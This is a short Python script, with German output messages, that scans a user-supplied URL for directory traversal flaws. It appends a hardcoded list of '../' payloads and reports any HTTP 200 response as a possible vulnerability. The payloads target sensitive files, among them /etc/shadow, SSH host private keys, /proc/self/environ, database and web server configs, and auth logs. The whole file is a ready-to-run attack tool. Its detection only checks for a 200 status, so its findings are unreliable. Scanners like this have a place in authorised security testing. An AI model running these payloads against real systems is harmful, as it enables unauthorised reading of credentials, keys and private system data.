import requests
from colorama import init, Fore, Style

init(autoreset=True)

def check_directory_traversal(url):
    payloads = [
    "../../../../../../../../../../../../../../../etc/passwd",
    "../../../../../../../../../../../../../../../etc/shadow",
    "../../../../../../../../../../../../../../../etc/group",
    "../../../../../../../../../../../../../../../etc/hosts",
    "../../../../../../../../../../../../../../../etc/hostname",
    "../../../../../../../../../../../../../../../etc/resolv.conf",
    "../../../../../../../../../../../../../../../etc/motd",
    "../../../../../../../../../../../../../../../etc/issue",
    "../../../../../../../../../../../../../../../etc/ssh/ssh_host_rsa_key",
    "../../../../../../../../../../../../../../../etc/ssh/ssh_host_dsa_key",
    "../../../../../../../../../../../../../../../etc/ssh/ssh_host_ecdsa_key",
    "../../../../../../../../../../../../../../../etc/ssh/ssh_host_ed25519_key",
    "../../../../../../../../../../../../../../../etc/ssh/ssh_config",
    "../../../../../../../../../../../../../../../etc/ssh/sshd_config",
    "../../../../../../../../../../../../../../../etc/mysql/my.cnf",
    "../../../../../../../../../../../../../../../etc/postgresql/pg_hba.conf",
    "../../../../../../../../../../../../../../../etc/nginx/nginx.conf",
    "../../../../../../../../../../../../../../../etc/apache2/apache2.conf",
    "../../../../../../../../../../../../../../../etc/httpd/conf/httpd.conf",
    "../../../../../../../../../../../../../../../var/log/auth.log",
    "../../../../../../../../../../../../../../../var/log/secure",
    "../../../../../../../../../../../../../../../var/log/apache2/access.log",
    "../../../../../../../../../../../../../../../var/log/nginx/access.log",
    "../../../../../../../../../../../../../../../var/log/httpd/access_log",
    "../../../../../../../../../../../../../../../var/log/mysql/mysql.log",
    "../../../../../../../../../../../../../../../var/log/postgresql/postgresql.log",
    "../../../../../../../../../../../../../../../proc/self/cmdline",
    "../../../../../../../../../../../../../../../proc/self/environ",
    "../../../../../../../../../../../../../../../proc/version",
    "../../../../../../../../../../../../../../../proc/cpuinfo",
    "../../../../../../../../../../../../../../../proc/mounts",
    "../../../../../../../../../../../../../../../proc/net/arp",
    "../../../../../../../../../../../../../../../proc/net/tcp",
    "../../../../../../../../../../../../../../../proc/net/udp",
    "../../../../../../../../../../../../../../../proc/self/status",
    "../../../../../../../../../../../../../../../proc/self/fd/0",
    "../../../../../../../../../../../../../../../proc/self/fd/1",
    "../../../../../../../../../../../../../../../proc/self/fd/2",
    "../../../../../../../../../../../../../../../proc/self/fd/3",
    "../../../../../../../../../../../../../../../proc/self/fd/4",
    "../../../../../../../../../../../../../../../proc/self/fd/5",
    "../../../../../../../../../../../../../../../proc/self/fd/6",
    "../../../../../../../../../../../../../../../proc/self/fd/7",
    # More Payloads Here ........................................
    # ...........................................................
]

    
    for payload in payloads:
        full_url = url + payload
        response = requests.get(full_url)
        
        if response.status_code == 200:
            print(Fore.RED + f"Mögliche Sicherheitslücke gefunden: {full_url}")
        else:
            print(Fore.GREEN + f"Es wurde keine Sicherheitslücke gefunden: {full_url}")

# Beispielaufruf
print(Fore.BLUE + "Target Url angeben:" )

target_url = input()  # Anpassen an die Zielseite
check_directory_traversal(target_url)
